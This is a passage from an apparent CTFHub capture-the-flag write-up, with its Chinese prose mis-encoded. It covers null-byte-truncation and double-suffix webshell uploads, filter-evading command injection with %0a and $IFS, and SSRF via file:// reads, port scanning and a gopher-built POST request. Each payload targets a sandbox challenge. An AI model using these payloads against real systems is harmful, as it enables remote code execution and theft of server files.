è·¯å¾„ï¼Œåªæ˜¯urlå˜åŒ–</p><p><code>http://challenge-6cc6a23c8f284d6b.sandbox.ctfhub.com:10800/?road=/var/www/html</code></p><p> çŒœæƒ³å¤šåŠé‡æ–°ä¸´æ—¶æ–‡ä»¶åï¼Œä¸å›ºå®šï¼Œå¯¼è‡´æ˜¾ç¤ºä¸äº†è·¯å¾„</p><p>è¿™é‡Œå°±éœ€è¦<code>00æˆªæ–­</code>ï¼Œè¦æŠŠæ–‡ä»¶ä¸Šä¼ çš„è·¯å¾„ï¼Œæ‰¾åˆ°ï¼Œå¥½ç”¨èšå‰‘è¿æ¥</p><p>å…ˆè¦æ¸…æ¥š<code>%00</code>æˆªæ–­ç‚¹åœ¨å“ªé‡Œï¼Œæˆ‘ä»¬å…ˆF12çœ‹</p><p>çœ‹ç½‘ç«™æºç </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CTFHub æ–‡ä»¶ä¸Šä¼  - 00æˆªæ–­<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>CTFHub æ–‡ä»¶ä¸Šä¼  - 00æˆªæ–­<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">?road</span>=<span class="string">/var/www/html/upload/</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">if (!empty($_POST[&#x27;submit&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">    $name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);</span></span><br><span class="line"><span class="comment">    $info = pathinfo($name);</span></span><br><span class="line"><span class="comment">    $ext = $info[&#x27;extension&#x27;];</span></span><br><span class="line"><span class="comment">    $whitelist = array(&quot;jpg&quot;, &quot;png&quot;, &quot;gif&quot;);</span></span><br><span class="line"><span class="comment">    if (in_array($ext, $whitelist)) &#123;</span></span><br><span class="line"><span class="comment">        $des = $_GET[&#x27;road&#x27;] . &quot;/&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $ext;</span></span><br><span class="line"><span class="comment">        if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $des)) &#123;</span></span><br><span class="line"><span class="comment">            echo &quot;&lt;script&gt;alert(&#x27;ä¸Šä¼ æˆåŠŸ&#x27;)&lt;/script&gt;&quot;;</span></span><br><span class="line"><span class="comment">        &#125; else &#123;</span></span><br><span class="line"><span class="comment">            echo &quot;&lt;script&gt;alert(&#x27;ä¸Šä¼ å¤±è´¥&#x27;)&lt;/script&gt;&quot;;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125; else &#123;</span></span><br><span class="line"><span class="comment">        echo &quot;æ–‡ä»¶ç±»å‹ä¸åŒ¹é…&quot;;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å‘ç°é‡Œé¢æœ‰ä¸€ä¸²ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>);</span><br><span class="line">    <span class="variable">$ext</span> = <span class="variable">$info</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">    <span class="variable">$whitelist</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;gif&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="variable">$des</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;road&#x27;</span>] . <span class="string">&quot;/&quot;</span> . <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>) . <span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>) . <span class="string">&quot;.&quot;</span> . <span class="variable">$ext</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$des</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;ä¸Šä¼ æˆåŠŸ&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;ä¸Šä¼ å¤±è´¥&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æ–‡ä»¶ç±»å‹ä¸åŒ¹é…&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p><code>move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;],$des)</code>è¿™ä¸ªå‡½æ•°å°±æ˜¯æŠŠä¸Šä¼ æ–‡ä»¶æ”¾åˆ°<code>$des</code>çš„è·¯å¾„ä¸Šå¹¶ä¸”æ”¹äº†æ–‡ä»¶å</p><p>æ‰€ä»¥æˆ‘ä»¬ä¸èƒ½è®©åé¢çš„<code>rand()</code>å’Œ<code>date()</code>è¿è¡Œï¼Œæ‰€ä»¥å¯¹äºå˜é‡<code>road</code>ã€ä¹Ÿå°±æ˜¯å¼€å§‹è®²åˆ°çš„ã€‘ï¼Œå°±éœ€è¦åœ¨å®ƒåé¢åŠ ä¸Šä¸€ä¸ª<code>%00</code>æˆªæ–­åé¢çš„è¯­å¥</p><p>ä¹Ÿå°±æ˜¯ä¸‹é¢è¿™ä¸ªè¯·æ±‚å¤´åé¢</p><p><img src="/2022/07/27/CTFHub-wp/image-20220731233456720.png" alt="image-20220731233456720"></p><p>å›¾ç‰‡æ­£å¸¸ä¸Šä¼ å°±å¯ä»¥ï¼Œè¿™å°±æ˜¯æŠŠå›¾ç‰‡å†…å®¹ä¸Šä¼ åˆ°<code>1.php</code>æ–‡ä»¶ä¸­ï¼Œè¿™æ ·è™½ç„¶æˆ‘ä»¬ä¸Šä¼ çš„æ˜¯ä¸€ä¸ªå›¾ç‰‡ï¼Œä½†å®é™…ä¸Šï¼Œæˆ‘ä»¬ä¸Šä¼ äº†ä¸€ä¸ªåä¸º<code>1.php</code>çš„ä¸€å¥è¯æœ¨é©¬</p><p>ã€åå­—ä¸é‡è¦ï¼Œè™½ç„¶å›¾ç‰‡å’Œ<code>php</code>æ–‡ä»¶åä¸€æ ·ï¼Œè¿™é‡Œ<code>1.php</code>æ˜¯éšä¾¿å–å¾—ï¼Œä¸»è¦èšå‰‘è¿æ¥çš„å°±æ˜¯å®ƒã€‘</p><p><img src="/2022/07/27/CTFHub-wp/image-20220731233716114.png"></p><p>ç”¨èšå‰‘è¿æ¥<code>url/upload/1.php</code></p><p>å¾—åˆ°<code>flag</code></p><h2 id="10-æ–‡ä»¶ä¸Šä¼ -åŒå†™åç¼€"><a href="#10-æ–‡ä»¶ä¸Šä¼ -åŒå†™åç¼€" class="headerlink" title="10.æ–‡ä»¶ä¸Šä¼ -åŒå†™åç¼€"></a>10.æ–‡ä»¶ä¸Šä¼ -åŒå†™åç¼€</h2><p>è¿›è¡Œäº†ä¸€æ¬¡è¿‡æ»¤phpåç¼€åï¼ŒåŒå†™phpä¸ºp<u>php</u>hpï¼Œè¿™æ ·å½“è¿‡æ»¤äº†__çš„phpï¼Œå‰©ä¸‹çš„ä»ç„¶æ˜¯phpï¼Œæ­£å¸¸ç”¨èšå‰‘è¿æ¥</p><p><img src="/2022/07/27/CTFHub-wp/image-20220731165549883.png" alt="image-20220731165549883"></p><p><img src="/2022/07/27/CTFHub-wp/image-20220731165841829.png" alt="image-20220731165841829"></p><p>å¾—åˆ°flag</p><h2 id="11-RCE-å‘½ä»¤æ³¨å…¥-ç»¼åˆè®­ç»ƒ"><a href="#11-RCE-å‘½ä»¤æ³¨å…¥-ç»¼åˆè®­ç»ƒ" class="headerlink" title="11.RCE-å‘½ä»¤æ³¨å…¥-ç»¼åˆè®­ç»ƒ"></a>11.RCE-å‘½ä»¤æ³¨å…¥-ç»¼åˆè®­ç»ƒ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="literal">FALSE</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$m</span> = [];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;ping -c 4 <span class="subst">&#123;$ip&#125;</span>&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>, <span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$m</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜</p><p>çœ‹åˆ°<code>|ï¼Œ;ï¼Œ&amp;</code>éƒ½è¢«è¿‡æ»¤äº†</p><p>é‚£ä¹ˆå¯ä»¥ç”¨<code>%0a</code>ä¹Ÿæ˜¯æ¢è¡Œç¬¦ä»£æ›¿</p><p>ç©ºæ ¼ï¼Œ&#x2F;ï¼Œcatï¼Œflagï¼Œctfhubï¼ˆè¿™äº›å¥½åƒä¸å¤§ç”¨çš„ä¸Šï¼Œæ²¡å…³ç³»ï¼‰</p><p><code>$IFS</code>ä»£æ›¿<code>ç©ºæ ¼</code>ï¼Œ<code>cat</code>å¯ä»¥ç”¨<code>more</code>ä»£æ›¿ï¼Œ<code>%09</code>ä»£æ›¿<code>TAB</code>é”®ï¼Œç”¨æ¥è¡¥å…¨<code>flag</code></p><p><code>?ip=120.0.0.1%0als</code></p><p><img src="/2022/07/27/CTFHub-wp/image-20220801215911504.png" alt="image-20220801215911504"></p><p>ç„¶å</p><p><code>?ip=120.0.0.1%0acd$IFS%09*_is_here%0als</code></p><p><img src="/2022/07/27/CTFHub-wp/image-20220801215930160.png" alt="image-20220801215930160"></p><p>åé¢å°±ç®€å•äº†</p><p><code>?ip=120.0.0.1%0acd$IFS%09*_is_here%0amore$IFS%09*24135173615424.php</code></p><p>å³é”®æŸ¥çœ‹æºç </p><p>å¾—åˆ°<code>flag</code></p><h2 id="12-SSRF-å†…ç½‘è®¿é—®"><a href="#12-SSRF-å†…ç½‘è®¿é—®" class="headerlink" title="12.SSRF-å†…ç½‘è®¿é—®"></a>12.SSRF-å†…ç½‘è®¿é—®</h2><p><img src="/2022/07/27/CTFHub-wp/image-20220802103546644.png" alt="image-20220802103546644"></p><p><img src="/2022/07/27/CTFHub-wp/.%5CCTFHub-wp%5Cimage-20220802103603770.png" alt="image-20220802103603770"></p><p>æ‰€ä»¥æ„é€ payload</p><p><code>http://challenge-c0c40a8ea91b3909.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php</code></p><p>å¾—åˆ°flag</p><h2 id="13-SSRF-ä¼ªåè®®è¯»å–æ–‡ä»¶"><a href="#13-SSRF-ä¼ªåè®®è¯»å–æ–‡ä»¶" class="headerlink" title="13.SSRF-ä¼ªåè®®è¯»å–æ–‡ä»¶"></a>13.SSRF-ä¼ªåè®®è¯»å–æ–‡ä»¶</h2><h3 id="ä¼ªåè®®"><a href="#ä¼ªåè®®" class="headerlink" title="ä¼ªåè®®"></a>ä¼ªåè®®</h3><p>äº‹å®ä¸Šæ˜¯å…¶æ”¯æŒçš„åè®®ä¸å°è£…åè®®ã€‚è€Œå…¶æ”¯æŒçš„éƒ¨åˆ†åè®®æœ‰ï¼š</p><pre><code>    file:// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ    http:// â€” è®¿é—® HTTP(s) ç½‘å€    ftp:// â€” è®¿é—® FTP(s) URLs    php:// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµ(I/O streams)</code></pre><p>æ ¹æ®æç¤ºï¼Œflagåœ¨Webç›®å½•ä¸‹ï¼ŒWebç›®å½•ä¸€èˆ¬æ˜¯åœ¨<code>/var/www/html/</code>ä¸‹</p><p><code>http://challenge-5c45d983b45e22b7.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php</code></p><p>å¾—åˆ°flag</p><h2 id="14-SSRF-ç«¯å£æ‰«æ"><a href="#14-SSRF-ç«¯å£æ‰«æ" class="headerlink" title="14.SSRF-ç«¯å£æ‰«æ"></a>14.SSRF-ç«¯å£æ‰«æ</h2><p>ç«¯å£æ‰«æï¼Œé‚£å°±åˆ©ç”¨çˆ†ç ´ï¼Œä»8000åˆ°9000æ‰«ä¸€éï¼Œçœ‹çœ‹flagåœ¨å“ªä¸ªç«¯å£ä¸‹</p><p><code>http://challenge-30d6aa92f511ee1f.sandbox.ctfhub.com:10800/?url=127.0.0.1:8000</code></p><p><img src="/2022/07/27/CTFHub-wp/image-20220802105640721.png" alt="image-20220802105640721"></p><p>çœ‹åˆ°é•¿åº¦ä¸åŒï¼Œæ‰“å¼€æŸ¥çœ‹å“åº”æ•°æ®åŒ…</p><p>å¾—åˆ°flag</p><h2 id="15-SSRF-POSTè¯·æ±‚"><a href="#15-SSRF-POSTè¯·æ±‚" class="headerlink" title="15.SSRF-POSTè¯·æ±‚"></a>15.SSRF-POSTè¯·æ±‚</h2><p><code>hintï¼šè¿™æ¬¡æ˜¯å‘ä¸€ä¸ªHTTP POSTè¯·æ±‚.å¯¹äº†.ssrfæ˜¯ç”¨phpçš„curlå®ç°çš„.å¹¶ä¸”ä¼šè·Ÿè¸ª302è·³è½¬.åŠ æ²¹å§éªšå¹´</code></p><p>å¼€å§‹æ˜¯ä¸€ä¸ªç©ºç™½é¡µé¢</p><p>ç½‘ç«™ä¸º</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://challenge-<span class="number">177</span>dcd6de76352cb.sandbox.ctfhub.com:<span class="number">10800</span>/?url=_</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åœ¨å…¶åé¢åŠ ä¸Š<code>127.0.0.1/flag.php</code>çœ‹çœ‹èƒ½ä¸èƒ½ç›´æ¥è®¿é—®è¯¥æ–‡ä»¶</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge-<span class="number">177</span>dcd6de76352cb.sandbox.ctfhub.com:<span class="number">10800</span><span class="regexp">/?url=127.0.0.1/</span>flag.php</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/CTFHub-wp/image-20220925221703912.png" alt="image-20220925221703912"></p><p>å‘ç°å‡ºç°äº†ä¸€ä¸ªè¾“å…¥æ¡†</p><p><code>F12</code>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/flag.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;key&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- De<span class="doctag">bug:</span> key=11e053e2b7900523ac51fc7606b964e2--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å‘ç°äº†ä¸€ä¸ª<code>key</code>çš„å‚æ•°</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">key</span>=11e053e2b7900523ac51fc7606b964e2</span><br><span class="line">//<span class="built_in">key</span>æ˜¯ä¸å®šçš„å“ˆï¼Œä¸è¦å…¨<span class="built_in">copy</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æŠŠ<code>key</code>å€¼è¾“å…¥æ¡†ä¸­è¯•è¯•</p><p><img src="/2022/07/27/CTFHub-wp/image-20220925222739689.png" alt="image-20220925222739689"></p><p>çœ‹æ¥åªèƒ½ä»æœ¬åœ°<code>127.0.0.1</code>è®¿é—®</p><p>åˆ©ç”¨<code>file://</code>ä¼ªåè®®ä»æœ¬åœ°æ–¹å¼è®¿é—®æ–‡ä»¶çœ‹çœ‹<code>index.php</code>æ–‡ä»¶</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge-<span class="number">177</span>dcd6de76352cb.sandbox.ctfhub.com:<span class="number">10800</span><span class="regexp">/?url=file:/</span><span class="regexp">//</span>var<span class="regexp">/www/</span>html/index.php</span><br></pre></td></tr></table></figure><p>å³é”®æŸ¥çœ‹ï¼Œ</p><p>å¾—åˆ°<code>index.php</code>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /?url=_&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure><p>ä»¥ç›¸åŒæ–¹å¼çœ‹çœ‹<code>flag.php</code>æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;) &#123;</span><br><span class="line">    echo &quot;Just View From 127.0.0.1&quot;;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$flag=getenv(&quot;CTFHUB&quot;);</span><br><span class="line">$key = md5($flag);</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] == $key) &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=&quot;/flag.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;</span><br><span class="line">&lt;!-- Debug: key=&lt;?php echo $key;?&gt;--&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>æ ¹æ®<code>flag.php</code>æœ€åçš„æç¤ºï¼Œ</p><p>å°è¯• <code>Gopher</code> åè®®å‘æœåŠ¡å™¨å‘é€ <code>POST</code> åŒ…</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Gopheråè®®çš„æ ¼å¼:</span><br><span class="line"></span><br><span class="line">gopher:<span class="regexp">//</span>IP:port<span class="regexp">/_TCP/</span>IPæ•°æ®æµ</span><br></pre></td></tr></table></figure><p>å…ˆæ„é€  <code>Gopher</code>åè®®æ‰€éœ€çš„ <code>POST</code>è¯·æ±‚ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/flag.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>36          </span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-sas"><span class="keyword">key</span>=11e053e2b7900523ac51fc7606b964e2</span></span><br><span class="line"><span class="language-sas"></span></span><br><span class="line"><span class="language-sas">//Content-<span class="keyword">Length</span> è¿™ä¸ªè¦å’Œåº•ä¸‹POSTå‚æ•°[åŒ…æ‹¬<span class="keyword">key</span>=,4ä¸ª]é•¿åº¦ä¸€è‡´</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œéœ€è¦å¯¹å…¶è¿›è¡Œä¸¤æ¬¡<code>url</code>ç¼–ç </p><p>æ ¹æ®<code>hint</code>ï¼Œè¯·æ±‚æœ‰<code>curl</code>åŠŸèƒ½</p><p>åœ¨å‘æœåŠ¡å™¨å‘é€è¯·æ±‚æ—¶ï¼Œé¦–å…ˆæµè§ˆå™¨ä¼šè¿›è¡Œä¸€æ¬¡ <code>URL</code>è§£ç ï¼Œ</p><p>å…¶æ¬¡æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åï¼Œåœ¨æ‰§è¡Œ<code>curl</code>åŠŸèƒ½æ—¶ï¼Œè¿›è¡Œç¬¬äºŒæ¬¡ <code>URL</code>è§£ç </p><p>å› æ­¤éœ€è¦ä¸¤æ¬¡<code>url</code>ç¼–ç </p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">`æ³¨`ï¼š</span><br><span class="line">åœ¨ç¬¬ä¸€æ¬¡ç¼–ç åçš„æ•°æ®ä¸­ï¼Œå°†`%<span class="number">0</span>A`å…¨éƒ¨æ›¿æ¢ä¸º`%<span class="number">0</span>D%<span class="number">0</span>A`ã€‚</span><br><span class="line"></span><br><span class="line">å› ä¸º Gopheråè®®åŒ…å«çš„è¯·æ±‚æ•°æ®åŒ…ä¸­ï¼Œå¯èƒ½åŒ…å«æœ‰`=`ã€`&amp;`ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œ</span><br><span class="line">é¿å…ä¸æœåŠ¡å™¨è§£æä¼ å…¥çš„å‚æ•°é”®å€¼å¯¹æ··æ·†ï¼Œæ‰€ä»¥å¯¹æ•°æ®åŒ…è¿›è¡Œ URLç¼–ç ï¼Œè¿™æ ·æœåŠ¡ç«¯ä¼šæŠŠ`%`åçš„å­—èŠ‚å½“åšæ™®é€šå­—èŠ‚ã€‚</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/CTFHub-wp/image-20220925231951671.png" alt="image-20220925231951671"></p><p>ç„¶åç¬¬äºŒæ¬¡ç¼–ç </p><p><img src="/2022/07/27/CTFHub-wp/image-20220925232013164.png" alt="image-20220925232013164"></p><p>å¾—åˆ°</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span 